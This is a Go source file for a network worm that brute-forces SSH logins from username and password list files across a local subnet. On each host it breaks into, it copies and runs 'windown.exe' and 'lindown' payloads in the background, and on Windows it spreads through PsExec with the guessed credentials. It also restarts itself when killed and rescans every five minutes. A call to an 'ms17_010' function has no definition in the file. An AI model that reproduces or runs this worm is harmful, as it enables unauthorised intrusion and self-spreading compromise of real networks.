package main

import (
	"runtime"
	"os"
	//"io/ioutil"
	//"strconv"
	"log"
    "syscall"
)

//Put in target subnet in the form 10.2.3.
import (
	"golang.org/x/crypto/ssh"
	"fmt"
	"time"
	"strings"
	"bufio"
	"sync"
	"github.com/tmc/scp"
	"github.com/syossan27/tebata"
	"os/exec"
	//"container/list"
	"net"
	"regexp"
)

func handler1() {
	cmd := exec.Command(os.Args[0])
	cmd.Start()
	os.Exit(13)
}

func main(){
    t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
	t.Reserve(handler1)
	myos := runtime.GOOS
	ms17_010()
	startwormingboi(myos)
	for len(os.Args) == 1{
		time.Sleep(5 * time.Minute)
		ms17_010()
		startwormingboi(myos)
	}
}

func startwormingboi(myos string) {

	var user = readinfile("user.txt")
	var passwds = readinfile("passwds.txt")
	for _, username := range(user) {
		for _, password := range(passwds) {
			pysexec(username, password)
		}
	}
	
	var subnets = ""
	if len(os.Args) == 1 {
		subnets = GetOutboundIP()
	}else {
		subnets = os.Args[1]
	}
	var step = [3]string{"10","30","40"}
	var myip = ""
	var wg sync.WaitGroup
		for _,element := range step{
			myip = joinstrings(subnets,element)
			fmt.Println(myip)
				wg.Add(1)
				go gettingin(myip, user, passwds, &wg, myos)
			}
			wg.Wait()
} 

func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup, myos string ){
	n := 0
	var iswin = false
	var passbreak = false
	for j := 0; j < len(user); j++ {
		for k := 0; k < len(passwds); k++ {
			if !(iswin) {
				n = len(getinssh(myip, user[j], passwds[k]))
			}
			if n == 3 {
				fmt.Printf("\n ssh works for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
				passbreak = true
				break
			}
			if n == 1{
				iswin = true
			}
			if iswin{
				if  myos == "windows"{

					wincon := getinwin(myip, user[j],passwds[k])
					if wincon == 1 {
						fmt.Println("Im in windows with", myip, user[j], passwds[k])
						passbreak = true
						break
					} else if wincon == 2{
						fmt.Printf("\n didnt work windows with %s %s %s", myip ,user[j], passwds[k])
					} else {
						fmt.Println("target machine does not have psexec enabled")
					}
				} else{
					fmt.Println("cant get onto windows from nonwindows :(")
					passbreak = true
					break
				}
				passbreak = true;
			}
			if n == 2{
				fmt.Println("ssh doesn't work for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
			}
		}
		if passbreak {
			passbreak = false
			break
		}
	}
	defer wg.Done()
}

func getinssh(myip string, user string, passwd string) (myreturn string) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd)},
	}
	var dest = joinstrings(myip, ":22")
	fmt.Println(dest)
	connection, err := ssh.Dial("tcp", dest, sshConfig)
	if err != nil {
		fmt.Println(err)
		if strings.Contains(err.Error(), "unable to authenticate") {
			return "no"
		} else {
			return "w"
		}
	}

	session := newsession(connection)
	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
	scpexec(session, "lindown", "/tmp/lindown")
	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
	session.Close()
	return "yes"
}

func newsession(connection *ssh.Client)(session *ssh.Session){
	session, err := connection.NewSession()
	if err != nil {

	}
	return
}

func execlinuxcmd( session *ssh.Session, cmd string)(err error) {
	_ , err = session.CombinedOutput(cmd)
	if err != nil {
	}
	return
}

func scpexec( session *ssh.Session, srcfile string, destfile string)() {
	err := scp.CopyPath(srcfile, destfile, session)
	if err != nil {
	}
	return
}



func getinwin(myip string, user string, passwd string) (wincon int) {
	pscom := "PsExec.exe"
	iparg := joinstrings("\\\\", myip)
	cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","cmd","/c","START","/b",".\\windown.exe" )
	output, _ := cmd.CombinedOutput()
	strout := string(output)
	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { 								//true work case
		//put payload here
		fmt.Println("exit 1")

		wincon = 1
	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true {						//false case
		wincon = 2
		fmt.Println("exit 2")
	} else {											//psexec doesn't work
		wincon = 3
		fmt.Println("exit 3")
	}
	return
}

func joinstrings(string1, string2 string) (mashstring string){
	var strs []string
	strs = append(strs, string1)
	strs = append(strs, string2)
	mashstring = strings.Join(strs, "")
	return
}

func readinfile(myfile string) (readinarr []string){
	file, err := os.Open(myfile)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        readinarr = append(readinarr, scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        log.Fatal(err)
    }
    return
}
func GetOutboundIP() (myip string) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	myip = localAddr.IP.String()
	re := regexp.MustCompile(`.*\..*\.`)
	myip = re.FindString(myip)
	return myip
}
